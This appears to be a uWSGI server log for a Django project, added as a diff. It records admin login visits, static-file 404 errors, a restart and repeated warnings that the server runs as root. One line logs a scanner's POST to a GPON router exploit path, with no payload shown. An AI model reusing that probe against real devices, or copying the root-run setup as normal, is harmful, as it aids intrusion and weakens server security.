+[pid: 26855|app: 0|req: 16/109] 113.89.33.12 () {40 vars in 748 bytes} [Wed Sep  9 09:23:37 2020] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 4)
+[pid: 26856|app: 0|req: 8/110] 113.89.33.12 () {40 vars in 785 bytes} [Wed Sep  9 09:23:37 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 30 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 24)
+[pid: 26853|app: 0|req: 64/111] 113.89.33.12 () {42 vars in 836 bytes} [Wed Sep  9 09:23:37 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26854|app: 0|req: 12/112] 113.89.33.12 () {42 vars in 850 bytes} [Wed Sep  9 09:23:37 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26857|app: 0|req: 13/113] 113.89.33.12 () {42 vars in 838 bytes} [Wed Sep  9 09:23:37 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26856|app: 0|req: 9/114] 113.89.33.12 () {42 vars in 831 bytes} [Wed Sep  9 09:23:37 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 9)
+[pid: 26855|app: 0|req: 17/115] 113.89.33.12 () {42 vars in 848 bytes} [Wed Sep  9 09:23:37 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 4)
+[pid: 26853|app: 0|req: 65/116] 101.91.62.89 () {36 vars in 563 bytes} [Wed Sep  9 09:35:42 2020] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 66/117] 87.248.68.255 () {32 vars in 472 bytes} [Wed Sep  9 09:38:07 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 67/118] 71.6.232.4 () {34 vars in 493 bytes} [Wed Sep  9 09:57:23 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 68/119] 37.115.201.165 () {32 vars in 474 bytes} [Wed Sep  9 12:52:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 69/120] 201.220.142.34 () {32 vars in 473 bytes} [Wed Sep  9 13:22:38 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 70/121] 113.247.109.239 () {38 vars in 512 bytes} [Wed Sep  9 13:43:17 2020] POST /GponForm/diag_Form?images/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 71/122] 168.196.129.250 () {32 vars in 473 bytes} [Wed Sep  9 13:51:43 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 72/123] 200.111.114.148 () {32 vars in 475 bytes} [Wed Sep  9 14:30:34 2020] GET / => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 73/124] 8.129.181.7 () {30 vars in 443 bytes} [Wed Sep  9 14:33:09 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 74/125] 183.136.190.62 () {40 vars in 661 bytes} [Wed Sep  9 15:44:42 2020] GET / => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 75/126] 113.89.10.18 () {42 vars in 825 bytes} [Wed Sep  9 15:47:53 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+[pid: 26853|app: 0|req: 76/127] 113.89.10.18 () {42 vars in 769 bytes} [Wed Sep  9 15:47:59 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+[pid: 26853|app: 0|req: 77/128] 113.89.10.18 () {42 vars in 835 bytes} [Wed Sep  9 15:48:09 2020] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 28)
+[pid: 26853|app: 0|req: 78/129] 113.89.10.18 () {42 vars in 837 bytes} [Wed Sep  9 15:48:10 2020] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 28)
+[pid: 26855|app: 0|req: 18/130] 113.89.10.18 () {42 vars in 874 bytes} [Wed Sep  9 15:48:12 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 5 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 4)
+[pid: 26853|app: 0|req: 79/131] 113.89.10.18 () {42 vars in 836 bytes} [Wed Sep  9 15:48:21 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+[pid: 26855|app: 0|req: 19/132] 113.89.10.18 () {42 vars in 850 bytes} [Wed Sep  9 15:48:21 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 4)
+[pid: 26853|app: 0|req: 80/133] 113.89.10.18 () {42 vars in 838 bytes} [Wed Sep  9 15:48:22 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+[pid: 26853|app: 0|req: 81/134] 113.89.10.18 () {42 vars in 831 bytes} [Wed Sep  9 15:48:22 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+[pid: 26853|app: 0|req: 82/135] 113.89.10.18 () {42 vars in 848 bytes} [Wed Sep  9 15:48:22 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 28)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Sep  9 23:51:05 2020] ***
+compiled with version: 8.3.1 20191121 (Red Hat 8.3.1-5) on 06 September 2020 04:09:07
+os: Linux-4.18.0-147.5.1.el8_1.x86_64 #1 SMP Wed Feb 5 02:00:39 UTC 2020
+nodename: Bruce
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/project/www/Django/SuperBruce
+writing pidfile to /usr/project/www/Django/SuperBruce/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/project/www/Django/SuperBruce
+your processes number limit is 6873
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 6
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.8 (default, Nov 21 2019, 19:31:34)  [GCC 8.3.1 20190507 (Red Hat 8.3.1-4)]
+PEP 405 virtualenv detected: /usr/project/www/Django/venv
+Set PythonHome to /usr/project/www/Django/venv
+Python main interpreter initialized at 0x151c640
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 2256864 bytes (2203 KB) for 150 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x151c640 pid: 30097 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 30097)
+spawned uWSGI worker 1 (pid: 30099, cores: 30)
+spawned uWSGI worker 2 (pid: 30100, cores: 30)
+spawned uWSGI worker 3 (pid: 30101, cores: 30)
+spawned uWSGI worker 4 (pid: 30102, cores: 30)
+spawned uWSGI worker 5 (pid: 30103, cores: 30)
+[pid: 30099|app: 0|req: 1/1] 113.89.10.18 () {42 vars in 825 bytes} [Wed Sep  9 15:51:31 2020] GET / => generated 145 bytes in 44 msecs (HTTP/1.1 500) 6 headers in 184 bytes (1 switches on core 0)
+[pid: 30099|app: 0|req: 2/2] 113.89.10.18 () {42 vars in 837 bytes} [Wed Sep  9 15:51:43 2020] GET /admin/ => generated 0 bytes in 12 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 1)
+[pid: 30103|app: 0|req: 1/3] 113.89.10.18 () {42 vars in 874 bytes} [Wed Sep  9 15:51:43 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 48 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 30099|app: 0|req: 3/4] 113.89.10.18 () {42 vars in 836 bytes} [Wed Sep  9 15:51:43 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 30100|app: 0|req: 1/5] 113.89.10.18 () {42 vars in 850 bytes} [Wed Sep  9 15:51:43 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 19 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 30099|app: 0|req: 4/6] 113.89.10.18 () {42 vars in 838 bytes} [Wed Sep  9 15:51:44 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 30101|app: 0|req: 1/7] 113.89.10.18 () {42 vars in 848 bytes} [Wed Sep  9 15:51:44 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 20 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 30099|app: 0|req: 5/8] 113.89.10.18 () {42 vars in 831 bytes} [Wed Sep  9 15:51:44 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 30099|app: 0|req: 6/9] 61.129.6.145 () {36 vars in 600 bytes} [Wed Sep  9 15:57:58 2020] GET /admin/login/?next=/admin => generated 2307 bytes in 16 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 1)
+[pid: 30099|app: 0|req: 7/10] 61.129.6.145 () {38 vars in 805 bytes} [Wed Sep  9 15:58:17 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
